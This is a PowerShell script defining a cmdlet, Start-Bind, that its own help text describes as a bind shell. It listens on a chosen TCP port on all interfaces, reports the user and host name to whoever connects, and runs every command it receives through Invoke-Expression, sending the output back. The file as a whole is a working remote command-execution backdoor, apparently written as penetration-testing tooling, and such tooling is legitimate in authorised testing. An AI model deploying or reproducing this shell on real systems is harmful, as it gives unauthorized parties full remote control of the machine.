<#
.SYNOPSIS
This cmdlet is for binding the PowerShell application to a listening port.


.DESCRIPTION
This cmdlet opens a Bind Shell that attaches to PowerShell and listens on a port that you define.


.PARAMETER Port
This parameter is for defining the listening port that PowerShell should attach too This cmdlet binds powershell to the port you speficy. The default value for this parameter is 1337.


.EXAMPLE
Start-Bind
# This examples connects powershell.exe to a listener on port 1337.

.EXAMPLE
Start-Bind -Port 1234
# This examples connects powershell.exe to a listener on port 1234.


.NOTES
Author: Robert H. Osborne
Alias: tobor
Contact: rosborne@osbornepro.com


.INPUTS
None


.OUTPUTS
None


.LINK
https://osbornepro.com
https://writeups.osbornepro.com
https://btpssecpack.osbornepro.com
https://github.com/tobor88
https://gitlab.com/tobor88
https://www.powershellgallery.com/profiles/tobor
https://www.linkedin.com/in/roberthosborne/
https://www.credly.com/users/roberthosborne/badges
https://www.hackthebox.eu/profile/52286
#>
Function Start-Bind {
    [CmdletBinding(SupportsShouldProcess, ConfirmImpact = 'Low')]
        param(
            [Parameter(
                Mandatory=$False,
                Position=0,
                ValueFromPipeline=$False,
                HelpMessage='Enter a port to listen on. Valid ports are between 1 and 65535. Example: 1234')] # End Parameter
            [ValidateRange(1,65535)]
            [Int32]$Port = 1337
        )  # End param


        $PortString = $Port.ToString()

        Write-Verbose "Checking for availability of $PortString"

        $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()
        $Connections = $TCPProperties.GetActiveTcpListeners()
        If ($Connections.Port -Contains "$Port")
        {

            Throw "[!] Port $Port is alreday in use by another process(es). Select another port to use or stop the occupying processes."

        }  # End If

        Write-Verbose "Creating listener on port $PortString"
        $Listener = New-Object -TypeName System.Net.Sockets.TcpListener]('0.0.0.0', $Port)

        If ($PSCmdlet.ShouldProcess($Listener.Start()))
        {

            Write-Output "[*] PowerShell.exe is bound to port $PortString"

            Try
            {

                While ($True)
                {

                    Write-Verbose "Begin loop allowing Ctrl+C to stop the listener"
                    If ($Listener.Pending())
                    {

                        $Client = $Listener.AcceptTcpClient()

                        Break;

                    }  # End If

                    Start-Sleep -Seconds 2

                }  # End While

            }  # End Try
            Finally
            {

                Write-Output "[*] Press Ctrl + C a couple of times in order to reuse the port you selected as a listener again"
                If ($Listener.Pending())
                {

                    Write-Output "[*] Closing open port"
                    $Client.Close()
                    $Listener.Stop()

                }  # End If

            }  # End Finally

            Write-Output "[*] Connection Established"
            $Stream = $Client.GetStream()

            Write-Verbose "Streaming bytes to PowerShell connection"
            [Byte[]]$Bytes = 0..65535 | ForEach-Object -Process { 0 }
            $SendBytes = ([Text.Encoding]::ASCII).GetBytes("Logged into PowerShell as $env:USERNAME on $env:COMPUTERNAME `n`n")

            $Stream.Write($SendBytes,0,$SendBytes.Length)
            $SendBytes = ([Text.Encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
            $Stream.Write($SendBytes,0,$SendBytes.Length)

            Write-Verbose "Begin command execution cycle"
            While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
            {

                $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
                $Data = $EncodedText.GetString($Bytes, 0, $i)

                Try
                {

                    $SendBack = (Invoke-Expression -Command $Data 2>&1 | Out-String)

                }  # End Try
                Catch
                {

                    Write-Output "Failure occured attempting to execute the command on target."

                    $Error[0] | Out-String

                }  # End Catch

                Write-Verbose "Initial data send failed. Attempting a second time"
                $SendBack2  = $SendBack + 'PS ' + (Get-Location | Select-Object -ExpandProperty 'Path') + '> '
                $x = ($Error[0] | Out-String)
                $Error.Clear()
                $SendBack2 = $SendBack2 + $x

                $SendByte = ([Text.Encoding]::ASCII).GetBytes($SendBack2)
                $Stream.Write($SendByte, 0, $SendByte.Length)
                $Stream.Flush()

            }  # End While

            Write-Verbose "Terminating connection"
            $Client.Close()
            $Listener.Stop()
            Write-Verbose "Connection closed"

        }  # End If
        Else
        {

            Write-Output "[*] Start-Bind would have bound PowerShell to a listener on port $PortString"

        }  # End Else

}  # End Function Start-Bind
